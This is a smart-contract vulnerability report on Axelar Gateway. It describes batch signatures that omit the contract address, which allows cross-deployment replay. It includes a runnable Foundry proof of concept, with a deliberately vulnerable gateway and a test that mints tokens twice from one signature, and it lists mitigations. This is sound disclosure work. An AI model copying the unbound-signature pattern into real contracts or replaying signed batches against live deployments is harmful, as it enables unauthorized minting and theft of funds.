## Brief/Intro
A batch-signature domain separation flaw allows validator-approved command batches to be replayed across two Axelar Gateway deployments on the same chain if they share the same `authModule` (operator set). Because the signed message binds to `chainId` but not to `address(this)`, the same proof verifies on both deployments, and since replay tracking is per-deployment, previously executed commands can be executed again on the second deployment. In production, this can cause privilege escalation, unauthorized mints or transfers, insolvency of wrapped assets, or direct theft.

## title 
High — Signatures not bound to gateway address (cross-deployment replay)

## Vulnerability Details
The gateway processes batches via `execute(bytes)`, which decodes `(bytes data, bytes proof)`, computes `messageHash = ECDSA.toEthSignedMessageHash(keccak256(data))`, and validates the proof against the `authModule`. The `data` tuple includes `chainId` and batch contents but omits `address(this)` (the verifying contract). As a result, a batch signed by the validator set for deployment A is indistinguishable from the same batch sent to deployment B if both deployments are on the same `chainId` and share the same `authModule` (operator set/policy), making the proof valid for both.

Additionally, the replay-prevention map of executed `commandId`s is tracked per deployment in contract storage. A fresh deployment (e.g., a new proxy) begins with an empty executed set. Therefore, a batch already executed on deployment A remains executable on deployment B.

Line evidence from the reported code paths:

```472:489:contracts/AxelarGateway.sol
(bytes memory data, bytes memory proof) = abi.decode(input, (bytes, bytes));
bytes32 messageHash = ECDSA.toEthSignedMessageHash(keccak256(data));
bool allowOperatorshipTransfer = IAxelarAuth(authModule).validateProof(messageHash, proof);
...
(chainId, commandIds, commands, params) = abi.decode(data, (uint256, bytes32[], string[], bytes[]));
if (chainId != block.chainid) revert InvalidChainId();
```

- The signature domain includes the EIP-191 prefix and `keccak256(data)`, but `data` omits `address(this)`.

```355:357:contracts/AxelarGateway.sol
function isCommandExecuted(bytes32 commandId) public view override returns (bool) {
    return getBool(_getIsCommandExecutedKey(commandId));
}
```

- Executed command tracking is local to the deployment’s storage, so a fresh proxy begins with no executed commands recorded.

Signature policy prevents malleability but does not add domain binding:

```31:64:contracts/ECDSA.sol
// lower-half s and v in {27,28}
```

Upgrade safeguards ensure implementation identity but do not affect signature domain separation:

```420:439:contracts/AxelarGateway.sol
if (newImplementationCodeHash != newImplementation.codehash) revert InvalidCodeHash();
if (contractId() != IContractIdentifier(newImplementation).contractId()) revert InvalidImplementation();
... delegatecall(setup)
```

Root cause:
- The signed message omits a contract-unique discriminator such as `address(this)` (or a full EIP-712 domain with `verifyingContract`).
- Replay-prevention (`isCommandExecuted`) is maintained per contract instance, so a second deployment starts with a clean slate.

Why this is a vulnerability:
- Without binding to `address(this)`, signatures are valid for any contract on the same chain using the same `authModule` and batch format. If two gateways coexist (e.g., canonical A and a separate B for migration/testing), the same signed batch can be accepted by both. Sensitive commands (e.g., `deployToken`, `mintToken`, `approveContractCallWithMint`, `burnToken`) can be replayed on B, causing unauthorized state changes on B with no fresh validator authorization.

## Impact Details
- **Privilege escalation across deployments**: Attackers (or any relayer) can cause state transitions on B using proofs intended for A.
- **Unauthorized mint/transfer**: Re-execution of `mintToken` or equivalent on B mints additional supply; re-approvals or transfers can be duplicated.
- **Insolvency and accounting drift**: Wrapped token supplies on B can exceed collateral backing, or escrow at B can be drained for externally-backed assets.
- **Direct loss of funds**: If B holds escrowed external tokens, replayed `mint/transfer`-like commands can move assets without new authorization.

The impact occurs when two deployments exist on the same chain with the same `authModule` and compatible command encoding, and B’s executed set has not yet recorded the previously executed `commandId`s.

## References
- `contracts/AxelarGateway.sol` — command processing and proof verification (notably `execute(bytes)` and `isCommandExecuted`)
- `contracts/auth/AxelarAuthWeighted.sol` — signature validation policy
- `contracts/ECDSA.sol` — signature checks (non-malleability) without domain binding to `verifyingContract`
- `contracts/AxelarGatewayProxy.sol` — proxy and upgrade path
- EIP-191 signed message format
- EIP-712 typed structured data; `verifyingContract` domain field

## Proof of Concept
This PoC demonstrates cross-deployment replay using a minimal reproduction of the described behavior. It creates:
- A mock auth module that validates a single-operator ECDSA signature.
- A vulnerable gateway that signs `toEthSignedMessageHash(keccak256(data))` where `data = abi.encode(chainId, commandIds, commands, params)` and omits `address(this)`.
- Two gateway deployments (`A` and `B`) sharing the same auth module.
- A single signed batch that mints on `A`, and then replays successfully on `B`.

The PoC is a real, runnable Foundry test.

### Run instructions
```bash
# 1) Create a fresh Foundry project
forge init axelar-domain-replay-poc
cd axelar-domain-replay-poc

# 2) Install OpenZeppelin for ECDSA
forge install openzeppelin/openzeppelin-contracts@v5.0.2

# 3) Replace / add the following files
```

Create `foundry.toml`:

```toml
[profile.default]
solc_version = "0.8.20"
optimizer = true
optimizer_runs = 200

remappings = [
  "openzeppelin-contracts/=lib/openzeppelin-contracts/"
]
```

Create `src/MockAuth.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ECDSA} from "openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";

interface IAxelarAuthLike {
    function validateProof(bytes32 messageHash, bytes calldata proof) external view returns (bool);
}

contract MockAuthWeighted is IAxelarAuthLike {
    using ECDSA for bytes32;

    address public immutable operatorSigner;

    constructor(address operator_) {
        operatorSigner = operator_;
    }

    function validateProof(bytes32 messageHash, bytes calldata proof) external view override returns (bool) {
        // Expect a single 65-byte ECDSA signature from operatorSigner
        address recovered = messageHash.recover(proof);
        return recovered == operatorSigner;
    }
}
```

Create `src/VulnerableGateway.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ECDSA} from "openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";

interface IAxelarAuthLike {
    function validateProof(bytes32 messageHash, bytes calldata proof) external view returns (bool);
}

contract VulnerableGateway {
    using ECDSA for bytes32;

    IAxelarAuthLike public immutable authModule;

    mapping(bytes32 => bool) public executed; // per-deployment executed map
    mapping(address => uint256) private balances; // demo state: internal token balances

    event Executed(bytes32 indexed commandId, string command);
    event Mint(address indexed to, uint256 amount);

    constructor(IAxelarAuthLike authModule_) {
        authModule = authModule_;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function execute(bytes calldata input) external {
        (bytes memory data, bytes memory proof) = abi.decode(input, (bytes, bytes));

        // Vulnerable: does NOT bind to address(this)
        bytes32 messageHash = ECDSA.toEthSignedMessageHash(keccak256(data));
        require(authModule.validateProof(messageHash, proof), "INVALID_PROOF");

        (uint256 chainId, bytes32[] memory commandIds, string[] memory commands, bytes[] memory params) =
            abi.decode(data, (uint256, bytes32[], string[], bytes[]));

        require(chainId == block.chainid, "INVALID_CHAIN_ID");
        require(commandIds.length == commands.length && commands.length == params.length, "LENGTH_MISMATCH");

        for (uint256 i = 0; i < commandIds.length; i++) {
            bytes32 commandId = commandIds[i];
            require(!executed[commandId], "ALREADY_EXECUTED");
            executed[commandId] = true;

            // Minimal command processor: support only "mintToken(address,uint256)"
            if (keccak256(bytes(commands[i])) == keccak256(bytes("mintToken"))) {
                (address to, uint256 amount) = abi.decode(params[i], (address, uint256));
                balances[to] += amount;
                emit Mint(to, amount);
            } else {
                revert("UNSUPPORTED_COMMAND");
            }

            emit Executed(commandId, commands[i]);
        }
    }
}
```

Create `test/CrossDeploymentReplay.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ECDSA} from "openzeppelin-contracts/contracts/utils/cryptography/ECDSA.sol";
import {MockAuthWeighted} from "src/MockAuth.sol";
import {VulnerableGateway} from "src/VulnerableGateway.sol";

contract CrossDeploymentReplayTest is Test {
    using ECDSA for bytes32;

    uint256 private operatorPk;
    address private operator;
    address private attacker;

    MockAuthWeighted private auth;
    VulnerableGateway private gatewayA;
    VulnerableGateway private gatewayB;

    function setUp() public {
        // Deterministic operator key for test signing
        operatorPk = 0xA11CE;
        operator = vm.addr(operatorPk);
        attacker = address(0xBEEF);

        auth = new MockAuthWeighted(operator);
        gatewayA = new VulnerableGateway(auth);
        gatewayB = new VulnerableGateway(auth);

        // Sanity: different contract addresses (separate deployments)
        assertTrue(address(gatewayA) != address(gatewayB));
    }

    function test_CrossDeploymentReplay_SucceedsOnB() public {
        // Build a single-command batch: mintToken(attacker, amount)
        uint256 amount = 1_000 ether;
        bytes32[] memory commandIds = new bytes32[](1);
        commandIds[0] = keccak256(abi.encodePacked("cmd-1"));

        string[] memory commands = new string[](1);
        commands[0] = "mintToken";

        bytes[] memory params = new bytes[](1);
        params[0] = abi.encode(attacker, amount);

        bytes memory data = abi.encode(block.chainid, commandIds, commands, params);

        // Sign message: EIP-191( keccak256(data) )
        bytes32 messageHash = ECDSA.toEthSignedMessageHash(keccak256(data));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operatorPk, messageHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        bytes memory input = abi.encode(data, sig);

        // Execute on Gateway A
        gatewayA.execute(input);
        assertEq(gatewayA.balanceOf(attacker), amount, "A should mint once");

        // Replay the exact same proof and data on Gateway B
        gatewayB.execute(input);
        assertEq(gatewayB.balanceOf(attacker), amount, "B should mint once independently");

        // Replaying again on A should revert due to A's per-deployment executed map
        vm.expectRevert("ALREADY_EXECUTED");
        gatewayA.execute(input);
    }
}
```

### Expected result
- The test passes, demonstrating that the exact same signed batch executes successfully on both `gatewayA` and `gatewayB` because the signature is not bound to `address(this)` and replay-prevention is per-deployment.

### Run the test
```bash
forge test -vv
```

### What would prevent this PoC
Binding signatures to the verifying contract breaks cross-deployment replays. For example, signing `hash = EIP712Hash(domain{verifyingContract=address(this)}, batch)` or, at minimum, `hash = toEthSignedMessageHash(keccak256(abi.encode(address(this), data)))` causes the proof created for `gatewayA` to fail when submitted to `gatewayB`.

### Mitigations
1) Bind signatures to verifying contract
- Adopt EIP-712 with domain `{name, version, chainId, verifyingContract = address(this)}` and validate on-chain.
- Alternatively, keep EIP-191 but include `address(this)` inside the hashed payload.

2) Add a deployment nonce/version into the signed payload
- Increment on migrations; old batches will not verify against the new deployment.

3) Operational controls and monitoring
- Enforce a single canonical proxy; avoid fresh-proxy migrations without carrying over the executed set.
- During migrations, run a replay test against the new deployment and ensure rejections for old batches.
- Monitor for identical `commandId`s executed by more than one gateway address on the same chain.
